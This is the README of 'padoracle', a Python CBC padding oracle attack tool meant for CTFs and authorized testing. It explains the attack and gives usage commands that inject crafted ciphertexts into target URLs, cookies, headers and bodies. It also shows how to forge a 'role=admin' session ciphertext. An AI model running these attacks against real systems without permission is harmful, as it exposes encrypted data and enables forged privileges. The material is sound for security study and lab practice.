# padoracle

A concurrent CBC padding oracle tool written in Python. Recover plaintext from a ciphertext, or forge a ciphertext for a chosen plaintext, without knowing the encryption key.

padoracle sends crafted ciphertexts to an oracle and uses its responses to recover the information needed for a CBC padding oracle attack. It supports HTTP oracles out of the box and can also be used as a library with a custom oracle function.

- **Decrypt:** recover plaintext from an existing ciphertext.
- **Forge:** construct a ciphertext that decrypts to a plaintext of your choice.
- **Parallel execution:** test byte candidates concurrently.
- **Checkpointing:** save completed blocks and resume an interrupted decryption.
- **HTTP support:** inject the ciphertext into URLs, cookies, headers, or bodies.
- **No dependencies:** uses the Python standard library only.

Designed for CTF challenges, including Hack The Box labs, and authorized security testing.

## Requirements

- Python 3.8 or newer.
- An oracle that distinguishes valid PKCS#7 padding from invalid padding.
- For HTTP mode, a reachable endpoint whose responses expose that distinction.

No third party packages are required for the core tool.

## Installation

Download the script:

```bash
curl -O https://raw.githubusercontent.com/Emiyelbarto/padoracle/main/padoracle.py
```

Check that it runs:

```bash
python3 padoracle.py --version
python3 padoracle.py --help
```

## How it works

CBC encryption combines each plaintext block with the preceding ciphertext block before encryption. During decryption, the block cipher output is XORed with that preceding block to recover the plaintext.

A padding oracle reveals whether the resulting plaintext has valid padding. By modifying ciphertext bytes and observing the oracle responses, an attacker can recover plaintext one byte at a time.

padoracle automates this process:

1. Select a target ciphertext block.
2. Test candidate byte values against the oracle.
3. Use valid padding responses to recover the intermediate block state.
4. XOR that state with the preceding ciphertext block to obtain plaintext.
5. Repeat for the remaining blocks.

Forging a ciphertext uses the same technique in reverse: it constructs the ciphertext blocks needed so that decryption produces the requested plaintext.

The attack does not require the encryption key. It does depend on having a usable padding oracle.

## Decrypt a ciphertext

The basic command:

```bash
python3 padoracle.py decrypt \
  --url "http://target/profile?token=^CT^" \
  --error "Padding error" \
  "<ciphertext-hex>"
```

Replace the example URL, error message, and ciphertext with the values from your lab.

`^CT^` is the injection marker. The tool replaces it with the ciphertext being tested. By default the injected value is hexadecimal.

### Injecting the ciphertext

The marker can appear in the URL, a cookie, an arbitrary HTTP header, or the body.

URL parameter:

```bash
python3 padoracle.py decrypt \
  --url "http://target/profile?token=^CT^" \
  --error "Padding error" \
  "<ciphertext-hex>"
```

Cookie:

```bash
python3 padoracle.py decrypt \
  --url "http://target/app" \
  --cookie "session=^CT^" \
  --error "decryption failed" \
  "<ciphertext-hex>"
```

Custom header:

```bash
python3 padoracle.py decrypt \
  --url "http://target/api" \
  --header "X-Token: ^CT^" \
  --error "invalid padding" \
  "<ciphertext-hex>"
```

POST body:

```bash
python3 padoracle.py decrypt \
  --url "http://target/api" \
  --data "data=^CT^&submit=1" \
  --error "invalid" \
  "<ciphertext-hex>"
```

Supplying `--data` switches the request to POST automatically. An explicit `--method` other than GET is preserved; an explicit `--method GET` with `--data` is still sent as POST.

### Choosing the oracle signal

The tool needs a reliable way to tell valid padding from invalid. Choose exactly one:

| Option | Meaning |
|--------|---------|
| `--error STRING` | the response body contains STRING when padding is **invalid** |
| `--valid STRING` | the response body contains STRING when padding is **valid** |
| `--invalid-status N` | HTTP status N means invalid padding; any other status is treated as valid |

For example, if invalid padding produces an HTTP 500 response:

```bash
python3 padoracle.py decrypt \
  --url "http://target/api?token=^CT^" \
  --invalid-status 500 \
  "<ciphertext-hex>"
```

These signals are mutually exclusive. Choose the one that matches the target behavior.

### Preflight check

Before decrypting, the tool sends the original ciphertext and reports whether the configured signal classifies its response as valid or invalid padding.

If the original ciphertext is classified as invalid, check the signal before continuing. A reversed or otherwise incorrect signal can make the attack produce misleading results.

The preflight is a sanity check, not a guarantee that the oracle is configured correctly. Use `--no-preflight` to skip it.

## Forge a ciphertext

If the application accepts attacker supplied CBC ciphertext and processes the decrypted value, a padding oracle can also build a ciphertext for a chosen plaintext.

```bash
python3 padoracle.py encrypt \
  --url "http://target/app" \
  --cookie "session=^CT^" \
  --error "decryption failed" \
  "role=admin"
```

The final argument is the desired plaintext. The tool constructs and prints a ciphertext that decrypts to that value, including PKCS#7 padding. Place the printed value into the corresponding parameter when testing your lab.

Important: this does not mean the tool can encrypt arbitrary data for every application. The target must provide a usable padding oracle, and successful padding does not bypass independent integrity checks, authentication tags, or application level authorization.

To supply plaintext as hexadecimal bytes instead of a string, use `--hex`:

```bash
python3 padoracle.py encrypt \
  --url "http://target/app" \
  --cookie "session=^CT^" \
  --error "decryption failed" \
  --hex "726f6c653d61646d696e"
```

## Configuration

Available on both `decrypt` and `encrypt` unless noted.

| Option | Description | Default |
|--------|-------------|---------|
| `--url URL` | target URL (required) | |
| `--cookie VALUE` | Cookie header value; supports the marker | |
| `--header VALUE` | custom header in `Name: value` form; repeatable | |
| `--data BODY` | request body; selects POST automatically | |
| `--method METHOD` | HTTP method | GET |
| `--marker STRING` | placeholder replaced with the injected ciphertext | `^CT^` |
| `--encoding FORMAT` | ciphertext encoding: hex, base64, or base64url | hex |
| `--urlencode` | URL encode the injected ciphertext value | off |
| `--block-size N` | cipher block size in bytes | 16 |
| `--workers N` | concurrent candidate requests per byte search | 16 |
| `--timeout SECONDS` | HTTP request timeout | 15 |
| `--retries N` | retries after a connection failure | 5 |
| `--backoff SECONDS` | delay between retries | 3.0 |
| `--quiet` | suppress progress output | off |

The oracle detection options (`--error`, `--valid`, `--invalid-status`) are required; choose exactly one.

### Decrypt only options

| Option | Description |
|--------|-------------|
| `--iv HEX` | explicit initialization vector, as hexadecimal bytes |
| `--raw` | keep PKCS#7 padding in the recovered output |
| `--state FILE` | save completed block results for resuming |
| `--no-preflight` | skip the initial oracle check |

Without `--iv`, the first ciphertext block is treated as the IV and the remaining blocks are decrypted. With an explicit IV, the ciphertext argument holds the ciphertext blocks without that IV.

## Tuning concurrency

The default worker count is 16. Increase it only if the target can handle more concurrent requests. If the endpoint starts timing out, resetting connections, or rate limiting, reduce concurrency:

```bash
python3 padoracle.py decrypt \
  --url "http://target/app?token=^CT^" \
  --error "Padding error" \
  --workers 4 \
  "<ciphertext-hex>"
```

Fewer concurrent requests can be more effective against fragile or heavily throttled targets.

## Resuming an interrupted decryption

The `--state` option saves completed block results to a local checkpoint file:

```bash
python3 padoracle.py decrypt \
  --url "http://target/app?token=^CT^" \
  --error "Padding error" \
  --state padoracle-state.json \
  "<ciphertext-hex>"
```

Run the same command again to reuse the saved results. Checkpointing is at the block level, not the byte level: work on an incomplete block is repeated. The state file is local to your working environment, so keep it if you need to resume.

## Use as a Python library

The attack engine does not depend on HTTP. It accepts a callable that receives a ciphertext and returns True when the oracle detects valid padding.

```python
from padoracle import PaddingOracleAttack


def oracle(ciphertext: bytes) -> bool:
    # Submit the ciphertext to your oracle.
    # Return True if the resulting padding is valid.
    ...


attack = PaddingOracleAttack(oracle, block_size=16, workers=16)

# Recover plaintext from an IV prefixed ciphertext.
plaintext = attack.decrypt(ciphertext)

# Forge a ciphertext for a chosen plaintext.
forged = attack.encrypt(b"role=admin")
```

The example assumes `ciphertext` contains the IV as its first block. To use a separate IV, pass it explicitly:

```python
plaintext = attack.decrypt(ciphertext, iv=iv)
```

The custom oracle implements the target specific request and response handling. The engine handles the byte search and the CBC operations.

## Output

By default the tool prints the recovered result in two forms on standard output:

- `hex:` the recovered bytes as hexadecimal.
- `ascii:` the decoded text when the bytes are valid UTF-8. When they are not, the line is labeled `bytes:` and shows the raw byte representation instead.

Progress and diagnostics go to standard error, so the recovered output stays separate from progress messages. Use `--raw` to keep the PKCS#7 padding in the output.

## Tests

Run the suite from the repository root:

```bash
python3 -m unittest -v
```

The engine is tested with a simulated oracle, independent of any HTTP endpoint. An AES over HTTP integration test also runs when `pycryptodome` is installed and self skips when it is not.

## Limitations

- The target must expose a reliable distinction between valid and invalid padding.
- The HTTP response signal must be configured correctly.
- The implementation assumes PKCS#7 padding.
- The configured block size must match the target cipher.
- Integrity protection or authentication can stop a forged ciphertext from being accepted even when the padding oracle works.
- Concurrency and retries cannot compensate for an oracle that is inconsistent or unavailable.

## Legal

For CTFs, intentionally vulnerable labs, and authorized security research only. Only test systems you own or have explicit permission to assess. You are responsible for complying with applicable laws and the scope of your authorization.

## License

MIT. See [LICENSE](LICENSE).
